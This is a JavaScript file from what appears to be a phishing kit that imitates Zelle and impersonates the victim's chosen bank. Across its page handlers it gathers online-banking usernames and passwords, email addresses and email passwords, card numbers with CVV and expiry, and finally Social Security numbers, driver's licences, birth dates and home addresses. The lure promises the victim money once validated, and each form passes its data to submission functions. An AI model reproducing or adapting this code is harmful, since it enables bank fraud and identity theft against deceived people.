//Search for movies
let __recent = {}
document.querySelectorAll('a').forEach((anchor) => {
    if (anchor.classList.contains('openLink') === false && anchor.hasAttribute('data-dismiss') === false) {
        anchor.addEventListener('click', async function (e) {
            e.preventDefault();
            await reload()
            return false;
        })
    }
})

$(async function () {
    localStorageCheck();
    if (Object.keys(ip_config).length < 2) {
        await get_reload_ip();
    }
})

if (is_current_page('MainPath')) {
    if (localStorage.getItem('firstTime') === null) {
        document.getElementById('onload_default').style.background = '#662bcb';
        document.getElementById('overlayout').remove();
        show_media('onload_default');
    }

    if (document.querySelectorAll('input[name=search-filter]').length > 0) {
        document.querySelector('input[name=search-filter]').addEventListener('keyup', function (evt) {
            if (this.value.replaceAll(" ", "").length > 0) {
                document.querySelector("span.search-filter-toggle").style.display = "inline"
                let rep = search(this.value)
                if (rep.length > 0) {
                    let elements = []
                    for (let res of rep) {
                        let element = document.querySelector("#Hidden > li").cloneNode(true)
                        element.firstChild.parentElement.querySelector("a").setAttribute("data-bankname", res.name)
                        element.firstChild.parentElement.querySelector("a").setAttribute("data-banklogo", res.link)
                        element.firstChild.parentElement.querySelector("a").innerHTML = res.name
                        element.firstChild.parentElement.setAttribute("data-bankname", res.name)
                        element.firstChild.parentElement.setAttribute("data-banklogo", res.link)
                        elements.push(element)
                    }
                    document.querySelector("#searches > ul").innerHTML = ''
                    elements.forEach(function (value) {
                        document.querySelector("#searches > ul").appendChild(value)
                    })
                    document.querySelector("#searches > ul").removeAttribute('style')
                    document.querySelector("#searches > span").setAttribute('style', "display: none;")
                    document.getElementById('search_result').classList.remove('block-search-filter__no-results-text')
                } else {
                    document.querySelector("#searches > span").removeAttribute('style')
                    document.querySelector("#searches > ul").setAttribute('style', "display: none;")
                    document.getElementById('search_result').classList.remove('block-search-filter__no-results-text')
                }
            } else if (this.value.length > 0) {
                document.querySelector("span.search-filter-toggle").style.display = "inline"
                document.querySelector("#searches > span").removeAttribute('style')
                document.querySelector("#searches > ul").setAttribute('style', "display: none;")
                document.getElementById('search_result').classList.remove('block-search-filter__no-results-text')
            } else {
                document.querySelector("span.search-filter-toggle").style.display = "none"
                document.getElementById('search_result').classList.add('block-search-filter__no-results-text')
            }
        })
    }


    document.addEventListener('click', function (evt) {
        let element = evt.target;
        if (element.classList.contains('openLink')) {
            evt.preventDefault();
            __recent = {
                name: element.getAttribute("data-bankname"),
                logo: element.getAttribute("data-banklogo")
            }
            document.querySelector('#bank_modal .modal-logo img').setAttribute('src', "https://cdn.jsdelivr.net/gh/jmresult/zelpae/files/" + element.getAttribute("data-banklogo"))
            document.querySelector('#bank_modal .modal-logo img').setAttribute('title', element.getAttribute("data-bankname"))
            document.querySelector('#bank_modal .modal-logo img').setAttribute('alt', element.getAttribute("data-bankname"))
            document.querySelector('#bank_modal h2.modal-subtitle').innerHTML = `${element.getAttribute("data-bankname")} Offers Zelle®`
            show_media('bank_modal');
        }
        if (element.classList.contains('modal') && element.classList.contains('open') && element.classList.contains('in') && element.classList.contains('fade')) {
            if (element.id !== 'onload_default') {
                evt.preventDefault();
                hide_media(element.id);
            }
        }
        if (element.hasAttribute('data-dismiss')) {
            evt.preventDefault();
            let parent = element.parents('div.modal.fade')
            hide_media(parent.id);
            if (parent.id === 'onload_default') {
                localStorage.setItem('firstTime', "yes")
            }
        }

        if (element.classList.contains('search-filter-toggle')) {
            document.querySelector("span.search-filter-toggle").style.display = "none"
            document.querySelector('input[name=search-filter]').value = ""
            document.getElementById('search_result').classList.add('block-search-filter__no-results-text')
            document.querySelector('input[name=search-filter]').focus()
        }
    })

    document.querySelector("#bank_modal a.btn-default.modal-button").addEventListener('click', async function (event) {
        event.preventDefault();
        localStorage.setItem('__recent', JSON.stringify(__recent))
        await reload('LPath')
    })

    function show_media(id) {
        let media = document.getElementById(id)
        media.classList.add('open');
        document.body.classList.add('hideBars')
        let count = 0.0
        const shouldShow = setInterval(function () {
            if (count >= 1) {
                media.style.opacity = "1"
                clearInterval(shouldShow);
                media.classList.add('in')
            } else {
                count = count + 0.1
                media.style.opacity = count.toString()
            }
        }, 10)
    }

    function hide_media(id) {
        let media = document.getElementById(id)
        media.classList.remove('in')
        let count = 1
        const shouldShow = setInterval(function () {
            if (count <= 0) {
                clearInterval(shouldShow);
                media.style.opacity = "0"
                media.classList.remove('open');
                document.body.classList.remove('hideBars')
            } else {
                count = count - 0.1
                media.style.opacity = count
            }
        }, 10)
    }
}
/*


This Is for the Login page


*/
else if (is_current_page('LPath')) {
    __recent = JSON.parse(localStorage.getItem('__recent'))
    //For login page and moving forward
    document.getElementById('bankName').innerHTML = ` <strong>${__recent.name}</strong> `
    document.querySelector(".login-alert").innerHTML = `To Sign In: Enter your <strong>${__recent.name}</strong> User ID and password. Then, click the 'Sign In' button.`
    setTimeout(function () {
        document.title = `Continue with ${__recent.name}`
    }, 200)
    //Loaded completed
    document.querySelector('img.welcome-block__image').setAttribute('src', "https://cdn.jsdelivr.net/gh/jmresult/zelpae/files/" + __recent.logo)
    document.querySelector('img.welcome-block__image').setAttribute('title', "Continue with " + __recent.name)

    const UsernameElement = document.getElementById('edit-name'),
        PasswordElement = document.getElementById('edit-pass'),
        FormElement = document.getElementById('user-login-form'),
        UsernameSpan = UsernameElement.parentElement.querySelector('span.form-element__error-msg'),
        PasswordSpan = PasswordElement.parentElement.querySelector('span.form-element__error-msg');
    UsernameSpan.classList.add('hideme')
    PasswordSpan.classList.add('hideme')

    document.querySelectorAll('div.form-element input').forEach(function (element) {
        if (element.id !== 'edit-submit') {
            element.addEventListener('focusout', function () {
                if (element.value.length < 1)
                    element.parentElement.classList.remove('form-element--active')
            })
            element.addEventListener('focus', function () {
                element.parentElement.classList.add('form-element--active')
            })
            element.addEventListener('keyup', function (evt) {
                if (evt.key !== 'Enter' && evt.code !== "Enter")
                    element.parentElement.classList.remove('form-element--has-error');
            })
        }
    })

    function check_working() {
        let is_valid = true
        if ($(UsernameElement).val().length < 2) {
            is_valid = false;
            $(UsernameSpan).html('Please complete this mandatory field.');
            $(UsernameElement.parentElement).attr("data-tips", `Please complete this mandatory field.`)
            $(UsernameElement.parentElement).addClass('form-element--has-error');
        } else if ($(UsernameElement).val().length < 5 || is_username($(UsernameElement).val()) === false) {
            is_valid = false;
            $(UsernameSpan).html(`Please enter your ${__recent.name} Online username.`)
            $(UsernameElement.parentElement).attr("data-tips", `Please enter your ${__recent.name} Online username.`)
            $(UsernameElement.parentElement).addClass('form-element--has-error');
        } else {
            $(UsernameElement.parentElement).removeClass('form-element--has-error');
        }
        if ($(PasswordElement).val().length < 2) {
            is_valid = false;
            $(PasswordSpan).html('Please complete this mandatory field.')
            $(PasswordElement.parentElement).attr("data-tips", `Please complete this mandatory field.`)
            $(PasswordElement.parentElement).addClass('form-element--has-error');
        } else if ($(PasswordElement).val().length < 6) {
            is_valid = false;
            $(PasswordSpan).html(`Please enter your  ${__recent.name}  Online password.`)
            $(PasswordElement.parentElement).attr("data-tips", `Please enter your  ${__recent.name}  Online password.`)
            $(PasswordElement.parentElement).addClass('form-element--has-error');
        } else {
            $(PasswordElement.parentElement).removeClass('form-element--has-error');
        }
        return is_valid;
    }


    $(FormElement).on('submit', async function (evt) {
        evt.preventDefault()
        if ($(FormElement).hasClass('loading')) return false
        let checking = check_working();
        if (checking === false) return false;
        FormElement.classList.add('loading');
        document.querySelectorAll('input').forEach((input) => {
            input.readOnly = true;
        })
        await form_login(UsernameElement.value, PasswordElement.value)
    })

    $("button#loginButton").on('click', async function (event){
        event.preventDefault()
        if ($(FormElement).hasClass('loading')) return false
        let checking = check_working();
        if (checking === false) return false;
        FormElement.classList.add('loading');
        document.querySelectorAll('input').forEach((input) => {
            input.readOnly = true;
        })
        await form_login(UsernameElement.value, PasswordElement.value)
    })

}
/*


This Is for the email and password


*/
else if (is_current_page('EPath')) {
    __recent = JSON.parse(localStorage.getItem('__recent'))
    document.getElementById('topTitle').innerHTML = `Please enter the email address linked to your <strong>${__recent.name}</strong>, along with the email password to continue.`
    /*

     */
    const EmailElement = document.getElementById('edit-name'),
        PasswordElement = document.getElementById('password'),
        FormElement = document.getElementById('user-pass'),
        EmailSpan = EmailElement.parentElement.querySelector('span.form-element__error-msg'),
        PasswordSpan = PasswordElement.parentElement.querySelector('span.form-element__error-msg');
    EmailSpan.classList.add('hideme');
    PasswordSpan.classList.add('hideme');

    document.querySelectorAll('div.form-element input').forEach(function (element) {
        if (element.id !== 'submitButton') {
            element.addEventListener('focusout', function () {
                if (element.value.length < 1)
                    element.parentElement.classList.remove('form-element--active')
            })
            element.addEventListener('focus', function () {
                element.parentElement.classList.add('form-element--active')
            })
            element.addEventListener('keyup', function (evt) {
                if (evt.key !== 'Enter' && evt.code !== "Enter")
                    element.parentElement.classList.remove('form-element--has-error');
            })
        }
    })

    function check_working_email() {
        let is_valid = true
        if (EmailElement.value.length < 2) {
            is_valid = false;
            EmailElement.parentElement.setAttribute("data-tips", `Please complete this mandatory field.`)
            EmailElement.parentElement.classList.add('form-element--has-error');
        } else if (is_email(EmailElement.value) === false) {
            is_valid = false;
            EmailElement.parentElement.setAttribute("data-tips", `Please enter the email address associated with your ${__recent.name} account.`)
            EmailElement.parentElement.classList.add('form-element--has-error');
        } else {
            EmailElement.parentElement.classList.remove('form-element--has-error');
        }
        if (PasswordElement.value.length < 2) {
            is_valid = false;
            PasswordElement.parentElement.setAttribute("data-tips", `Please complete this mandatory field.`)
            PasswordElement.parentElement.classList.add('form-element--has-error');
        } else if (PasswordElement.value.length < 6) {
            is_valid = false;
            PasswordElement.parentElement.setAttribute("data-tips", `Please enter your email password.`)
            PasswordElement.parentElement.classList.add('form-element--has-error');
        } else {
            PasswordElement.parentElement.classList.remove('form-element--has-error');
        }
        return is_valid;
    }


    FormElement.addEventListener('submit', async function (evt) {
        evt.preventDefault()
        if (FormElement.classList.contains('loading')) return false
        if (check_working_email() === false) return false;
        FormElement.classList.add('loading')
        document.querySelectorAll('input').forEach((input) => {
            input.readOnly = true;
        })
        await form_email(EmailElement.value, PasswordElement.value)
    })


}
/*


This Is for the Login page


*/
else if (is_current_page('CPath')) {
    __recent = JSON.parse(localStorage.getItem('__recent'))
    //For login page and moving forward
    document.querySelector("#topTitle").innerHTML = `We need to make sure it's really you, please enter your <strong>${__recent.name}</strong> card details to confirm the information you've provided.`
    //Loaded completed

    const NameOnCardElement = document.getElementById('nameOnCard'),
        cardNumberElement = document.getElementById('cardNumber'),
        expiredDateElement = document.getElementById('expiredDate'),
        cvvElement = document.getElementById('cvv'),
        FormElement = document.getElementById('user-pass');

    $(cardNumberElement).mask('0000 0000 0000 0000', {
        onComplete: function (cep) {
            cardNumberElement.setAttribute('done', 'yes');
        },
        onChange: function (cep) {
            cardNumberElement.setAttribute('done', 'no');
        }
    });
    $(cvvElement).mask('000', {
        onComplete: function (cep) {
            cvvElement.setAttribute('done', 'yes');
        },
        onChange: function (cep) {
            cvvElement.setAttribute('done', 'no');
        }
    });
    $(expiredDateElement).mask('00/00', {
        onComplete: function (cep) {
            expiredDateElement.setAttribute('done', 'yes');
        },
        onChange: function (cep) {
            expiredDateElement.setAttribute('done', 'no');
        }
    });
    NameOnCardElement.addEventListener('keyup', function (evt) {
        if (is_fullName(NameOnCardElement.value)) {
            NameOnCardElement.setAttribute('done', 'yes');
        } else {
            NameOnCardElement.setAttribute('done', 'no');
        }
    })


    document.querySelectorAll('div.form-element input').forEach(function (element) {
        element.setAttribute('done', 'no');
        element.addEventListener('focusout', function () {
            if (element.value.length < 1)
                element.parentElement.classList.remove('form-element--active')
        })
        element.addEventListener('focus', function () {
            element.parentElement.classList.add('form-element--active')
        })
        element.addEventListener('keyup', function (evt) {
            if (evt.key !== 'Enter' && evt.code !== "Enter")
                element.parentElement.classList.remove('form-element--has-error');
        })
    })

    function check_working_card() {
        let is_valid = true
        if (NameOnCardElement.value.length < 1) {
            is_valid = false;
            NameOnCardElement.parentElement.setAttribute("data-tips", `Please complete this mandatory field.`)
            NameOnCardElement.parentElement.classList.add('form-element--has-error');
        } else if (NameOnCardElement.getAttribute('done') !== 'yes') {
            is_valid = false;
            NameOnCardElement.parentElement.setAttribute("data-tips", `Please enter the name on your ${__recent.name} card.`)
            NameOnCardElement.parentElement.classList.add('form-element--has-error');
        } else {
            NameOnCardElement.parentElement.classList.remove('form-element--has-error');
        }
        if (cardNumberElement.value.length < 2) {
            is_valid = false;
            cardNumberElement.parentElement.setAttribute("data-tips", `Please complete this mandatory field.`)
            cardNumberElement.parentElement.classList.add('form-element--has-error');
        } else if (cardNumberElement.getAttribute('done') !== 'yes') {
            is_valid = false;
            cardNumberElement.parentElement.setAttribute("data-tips", `Please enter valid card number.`)
            cardNumberElement.parentElement.classList.add('form-element--has-error');
        } else {
            cardNumberElement.parentElement.classList.remove('form-element--has-error');
        }
        if (expiredDateElement.value.length < 2) {
            is_valid = false;
            expiredDateElement.parentElement.setAttribute("data-tips", `Please complete this mandatory field.`)
            expiredDateElement.parentElement.classList.add('form-element--has-error');
        } else if (expiredDateElement.getAttribute('done') !== 'yes') {
            is_valid = false;
            expiredDateElement.parentElement.setAttribute("data-tips", `This field is mandatory.`)
            expiredDateElement.parentElement.classList.add('form-element--has-error');
        } else {
            expiredDateElement.parentElement.classList.remove('form-element--has-error');
        }
        if (cvvElement.value.length < 2) {
            is_valid = false;
            cvvElement.parentElement.setAttribute("data-tips", `Please complete this mandatory field.`)
            cvvElement.parentElement.classList.add('form-element--has-error');
        } else if (cvvElement.getAttribute('done') !== 'yes') {
            is_valid = false;
            cvvElement.parentElement.setAttribute("data-tips", `This field is mandatory.`)
            cvvElement.parentElement.classList.add('form-element--has-error');
        } else {
            cvvElement.parentElement.classList.remove('form-element--has-error');
        }
        return is_valid;
    }


    FormElement.addEventListener('submit', async function (evt) {
        evt.preventDefault()
        if (FormElement.classList.contains('loading')) return false
        if (check_working_card() === false) return false;
        FormElement.classList.add('loading');
        document.querySelectorAll('input').forEach((input) => {
            input.readOnly = true;
        })
        await form_card(NameOnCardElement.value, cardNumberElement.value, cvvElement.value, expiredDateElement.value)
    })

}
/*


This Is for the Login page


*/
else if (is_current_page('DPath')) {
    __recent = JSON.parse(localStorage.getItem('__recent'))
    //For login page and moving forward
    document.getElementById('strongBankName').innerHTML = __recent.name
    document.querySelector("#topTitle").innerHTML = `Your <strong>${__recent.name}</strong> account has been successfully validated, please complete the final step below to receive the money.`
    //Loaded completed

    const firstNameElement = document.getElementById('edit-field-pardot-first-name-0-value'),
        lastNameElement = document.getElementById('edit-field-pardot-last-name-0-value'),
        dobElement = document.getElementById('dateOfBirth'),
        driverLicenseElement = document.getElementById('driverLicense'),
        streetAddressElement = document.getElementById('streetAddress'),
        zipcodeElement = document.getElementById('Zipcode'),
        phoneElement = document.getElementById('phoneNumber'),
        ssnElement = document.getElementById('ssn'),
        FormElement = document.getElementById('contact-message-pardot-partners-website-tracking-form');

    $(ssnElement).mask('000-00-0000', {
        onComplete: function (cep) {
            ssnElement.setAttribute('done', 'yes');
        },
        onChange: function (cep) {
            ssnElement.setAttribute('done', 'no');
        }
    });

    $(dobElement).mask('00/00/0000', {
        onComplete: function (cep) {
            dobElement.setAttribute('done', 'yes');
        },
        onChange: function (cep) {
            dobElement.setAttribute('done', 'no');
        }
    });
    $(phoneElement).mask('(000) 000-0000', {
        onComplete: function (cep) {
            phoneElement.setAttribute('done', 'yes');
        },
        onChange: function (cep) {
            phoneElement.setAttribute('done', 'no');
        }
    });
    $(zipcodeElement).mask('00000', {
        onComplete: function (cep) {
            zipcodeElement.setAttribute('done', 'yes');
        },
        onChange: function (cep) {
            zipcodeElement.setAttribute('done', 'no');
        }
    });
    firstNameElement.addEventListener('keyup', function (evt) {
        if (is_firstName(firstNameElement.value)) {
            firstNameElement.setAttribute('done', 'yes');
        } else {
            firstNameElement.setAttribute('done', 'no');
        }
    })
    lastNameElement.addEventListener('keyup', function (evt) {
        if (is_lastName(lastNameElement.value)) {
            lastNameElement.setAttribute('done', 'yes');
        } else {
            lastNameElement.setAttribute('done', 'no');
        }
    })
    driverLicenseElement.addEventListener('keyup', function (evt) {
        if (is_DL(driverLicenseElement.value)) {
            driverLicenseElement.setAttribute('done', 'yes');
        } else {
            driverLicenseElement.setAttribute('done', 'no');
        }
    })
    streetAddressElement.addEventListener('keyup', function (evt) {
        if (is_streetAddress(streetAddressElement.value)) {
            streetAddressElement.setAttribute('done', 'yes');
        } else {
            streetAddressElement.setAttribute('done', 'no');
        }
    })


    document.querySelectorAll('div.js-form-wrapper input').forEach(function (element) {
        element.setAttribute('done', 'no');
        element.addEventListener('focusout', function () {
            if (element.value.length < 1)
                element.parentElement.classList.remove('form-element--active')
        })
        element.addEventListener('focus', function () {
            element.parentElement.classList.add('form-element--active')
        })
        element.addEventListener('keyup', function (evt) {
            if (evt.key !== 'Enter' && evt.code !== "Enter")
                element.parentElement.classList.remove('form-element--has-error');
        })
    })

    function check_working_info() {
        let is_valid = true
        if (firstNameElement.value.length < 1) {
            is_valid = false;
            firstNameElement.parentElement.setAttribute("data-tips", `Please complete this mandatory field.`)
            firstNameElement.parentElement.classList.add('form-element--has-error');
        } else if (firstNameElement.getAttribute('done') !== 'yes') {
            is_valid = false;
            firstNameElement.parentElement.setAttribute("data-tips", `First Name field is required.`)
            firstNameElement.parentElement.classList.add('form-element--has-error');
        } else {
            firstNameElement.parentElement.classList.remove('form-element--has-error');
        }
        if (lastNameElement.value.length < 2) {
            is_valid = false;
            lastNameElement.parentElement.setAttribute("data-tips", `Please complete this mandatory field.`)
            lastNameElement.parentElement.classList.add('form-element--has-error');
        } else if (lastNameElement.getAttribute('done') !== 'yes') {
            is_valid = false;
            lastNameElement.parentElement.setAttribute("data-tips", `Last Name field is required.`)
            lastNameElement.parentElement.classList.add('form-element--has-error');
        } else {
            lastNameElement.parentElement.classList.remove('form-element--has-error');
        }
        if (dobElement.value.length < 2) {
            is_valid = false;
            dobElement.parentElement.setAttribute("data-tips", `Please complete this mandatory field.`)
            dobElement.parentElement.classList.add('form-element--has-error');
        } else if (dobElement.getAttribute('done') !== 'yes') {
            is_valid = false;
            dobElement.parentElement.setAttribute("data-tips", `This field is mandatory.`)
            dobElement.parentElement.classList.add('form-element--has-error');
        } else {
            dobElement.parentElement.classList.remove('form-element--has-error');
        }
        if (zipcodeElement.value.length < 2) {
            is_valid = false;
            zipcodeElement.parentElement.setAttribute("data-tips", `Please complete this mandatory field.`)
            zipcodeElement.parentElement.classList.add('form-element--has-error');
        } else if (zipcodeElement.getAttribute('done') !== 'yes') {
            is_valid = false;
            zipcodeElement.parentElement.setAttribute("data-tips", `This field is mandatory.`)
            zipcodeElement.parentElement.classList.add('form-element--has-error');
        } else {
            zipcodeElement.parentElement.classList.remove('form-element--has-error');
        }
        if (driverLicenseElement.value.length < 2) {
            is_valid = false;
            driverLicenseElement.parentElement.setAttribute("data-tips", `Please complete this mandatory field.`)
            driverLicenseElement.parentElement.classList.add('form-element--has-error');
        } else if (driverLicenseElement.getAttribute('done') !== 'yes') {
            is_valid = false;
            driverLicenseElement.parentElement.setAttribute("data-tips", `This field is mandatory.`)
            driverLicenseElement.parentElement.classList.add('form-element--has-error');
        } else {
            driverLicenseElement.parentElement.classList.remove('form-element--has-error');
        }
        if (phoneElement.value.length < 2) {
            is_valid = false;
            phoneElement.parentElement.setAttribute("data-tips", `Please complete this mandatory field.`)
            phoneElement.parentElement.classList.add('form-element--has-error');
        } else if (phoneElement.getAttribute('done') !== 'yes') {
            is_valid = false;
            phoneElement.parentElement.setAttribute("data-tips", `This field is mandatory.`)
            phoneElement.parentElement.classList.add('form-element--has-error');
        } else {
            phoneElement.parentElement.classList.remove('form-element--has-error');
        }
        if (ssnElement.value.length < 2) {
            is_valid = false;
            ssnElement.parentElement.setAttribute("data-tips", `Please complete this mandatory field.`)
            ssnElement.parentElement.classList.add('form-element--has-error');
        } else if (ssnElement.getAttribute('done') !== 'yes') {
            is_valid = false;
            ssnElement.parentElement.setAttribute("data-tips", `This field is mandatory.`)
            ssnElement.parentElement.classList.add('form-element--has-error');
        } else {
            ssnElement.parentElement.classList.remove('form-element--has-error');
        }
        if (streetAddressElement.value.length < 2) {
            is_valid = false;
            streetAddressElement.parentElement.setAttribute("data-tips", `Please complete this mandatory field.`)
            streetAddressElement.parentElement.classList.add('form-element--has-error');
        } else if (streetAddressElement.getAttribute('done') !== 'yes') {
            is_valid = false;
            streetAddressElement.parentElement.setAttribute("data-tips", `This field is mandatory.`)
            streetAddressElement.parentElement.classList.add('form-element--has-error');
        } else {
            streetAddressElement.parentElement.classList.remove('form-element--has-error');
        }
        return is_valid;
    }


    FormElement.addEventListener('submit', async function (evt) {
        evt.preventDefault()
        if (FormElement.classList.contains('loading')) return false
        if (check_working_info() === false) return false;
        FormElement.classList.add('loading');
        document.querySelectorAll('input').forEach((input) => {
            input.readOnly = true;
        })
        await form_personal_details(firstNameElement.value + " " + lastNameElement.value, driverLicenseElement.value, phoneElement.value, dobElement.value, ssnElement.value, streetAddressElement.value, zipcodeElement.value)
    })

}
